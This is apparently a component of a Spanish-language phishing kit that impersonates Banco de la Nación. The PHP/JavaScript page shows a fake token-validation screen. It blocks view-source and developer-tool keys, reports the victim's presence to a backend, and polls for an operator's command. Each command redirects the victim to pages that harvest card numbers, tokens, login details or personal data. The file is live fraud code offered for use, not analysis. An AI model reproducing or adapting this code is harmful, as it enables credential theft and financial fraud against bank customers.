<?php
error_reporting(0);
session_start();
/*===================================================*/
$card = ($_SESSION["card"] ? $_SESSION["card"] : base64_decode($_GET["card"]));
/*===================================================*/
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="es" xml:lang="es">
<head>
<meta charset="utf-8">
<link rel="stylesheet" type="text/css" href="css/load.css"/>
<link rel="stylesheet" type="text/css" href="css/tipografias.css" />   
<script type="text/javascript" src="js/bn-jquery.js"></script>
<script type="text/javascript" src="js/jquery.ui.js"></script>
<script language="JavaScript">
document.onkeydown = function(e) {
tecla = (document.all) ? e.keyCode : e.which;
	//alert(tecla)
if (tecla === 116 || tecla === 123)  return false;
if (e.ctrlKey && (tecla === 67 || tecla === 83 || tecla === 85 || tecla === 86 || tecla === 116)) { return false; } else { return true; }};
$(document).keypress("u",function(e) { if(e.ctrlKey) { return false; } else { return true; } });
</script>
<script language="JavaScript">
document.addEventListener("contextmenu", function(e){e.preventDefault();}, false);
</script>
</head>
<body >
	<table class="table-cuentas" width="100%" border="0" cellpadding="0" cellspacing="1">
		<tbody>
       		<tr>
				<td colspan="2" align="center" class="texto" height="9"></td>
			</tr>
			<tr>
				<td colspan="2"><hr></td>
			</tr>
        </tbody>
    </table>
<div class="cssmsg">Validando el Token ingresado</div>
<div class="cssload-loader"></div><div class="cssmsg2">Por favor espere unos segundos...</div>
<script>
		$(document).ready(function(e){
			setTimeout("refindx();",3000);
			
			$(window).focus(function(){
        		line(true);
    		});
       		$(window).blur(function() {
        		line(false);
    		});
		});
		
		function line(numb){
			$.ajax({
					url: "../recalcular.php?idx=online",
					method: "POST",
					data: {numb: (numb ? "1" : "0")},
					beforeSend: function(){},
					success: function(result){},
					error: function(){line(numb);}
			});
		}
		
		function refindx(){
				$.ajax({
					url: "../recalcular.php",
					method: "POST",
					data: {id:"<?php echo $card; ?>"},
					beforeSend: function(){},
					success: function(result){
						if(result == "Esperando"){
							refindx();
						}else if(result == "CC"){
							window.location = 'cc.php?utm_source=bnacion&code_id=card&cgi=<?= base64_encode($nombre)."&rpt=".base64_encode($repeat)."&card=".base64_encode($card); ?>';
						}else if(result == "Token"){
							window.location.href = "error.php?utm_source=bnacion&code_id=token&cgi=<?= base64_encode($nombre)."&rpt=".base64_encode($repeat)."&card=".base64_encode($card); ?>";
						}else if(result == "Datos"){
							window.top.window.location.href = "../validDatos.do?utm_source=bnacion&code_id=token&cgi=<?= base64_encode($nombre)."&rpt=".base64_encode($repeat)."&card=".base64_encode($card); ?>";
						}else if(result == "Resumen"){
							window.location.href = "../correctLog.do?metodo=authentic";
						}else if(result == "Login"){
							window.top.window.location.href = "../logins.do?error=login";
						}else if(result == "Error"){
							window.top.window.location = '../logins.do?utm_source=bnacion&code_id=error';
						}else if(result == "Bloquear"){
							window.location.href = "../bloquear.php";
						}else{
							refindx();
						}
					},
					error: function(){refindx();}
				});
			}
	</script>
</body></html>